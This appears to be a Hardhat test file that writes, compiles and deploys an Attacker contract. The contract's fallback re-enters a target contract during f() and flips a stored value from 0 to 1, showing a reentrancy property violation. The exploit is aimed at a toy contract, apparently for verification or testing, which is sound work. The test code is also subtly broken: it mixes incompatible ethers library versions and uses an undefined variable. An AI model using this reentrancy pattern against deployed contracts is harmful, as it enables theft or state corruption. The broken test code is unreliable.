
const { expect } = require("chai");
const { ethers, run } = require("hardhat");
const fs = require("fs");
const path = require("path");

describe("Reentrancy property violation: x should be 0 after f", function () {
  before(async function () {
    // Dynamically add an attacker contract and compile it
    const attackerPath = path.join(__dirname, "../contracts/Attacker.sol");
    const attackerSrc = `
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.25;

    interface IReentrancy {
        function s(uint256 _x) external;
    }

    contract Attacker {
        address public target;
        constructor(address _target) {
            target = _target;
        }
        // Triggered by Reentrancy.f via a.call("")
        fallback() external {
            // Reenter and set x to 1
            IReentrancy(target).s(1);
        }
    }`;

    // Write attacker file if it doesn't exist
    if (!fs.existsSync(attackerPath)) {
      fs.writeFileSync(attackerPath, attackerSrc);
    } else {
      // Ensure the content is up to date
      const current = fs.readFileSync(attackerPath, "utf8");
      if (current !== attackerSrc) {
        fs.writeFileSync(attackerPath, attackerSrc);
      }
    }

    // Compile all contracts (including the newly added attacker)
    await run("compile");
  });

  it("violates the property: x becomes non-zero after calling f", async function () {
    const Reentrancy = await ethers.getContractFactory("Reentrancy");
    const reentrancy = await Reentrancy.deploy();
    await reentrancy.waitForDeployment();

    const Attacker = await ethers.getContractFactory("Attacker");
    const attacker = await Attacker.deploy(reentrancy.address);
    await attacker.waitForDeployment();

    // x is stored at slot 0; default is 0
    const zero32 = ethers.utils.hexZeroPad("0x0", 32);
    const one32 = ethers.utils.hexZeroPad("0x1", 32);

    const signer = await ethers.getSigner(deployer);

    let xBefore = await ethers.provider.getStorageAt(reentrancy.address, 0);
    expect(xBefore).to.equal(zero32);

    // Call f with the attacker's address; attacker fallback reenters and sets x = 1
    const tx = await reentrancy.f(attacker.address);
    await tx.wait();

    // Verify x changed to 1 (non-zero) after f returns, violating the property
    const xAfter = await ethers.provider.getStorageAt(reentrancy.address, 0);
    expect(xAfter).to.equal(one32);
  });
});
  
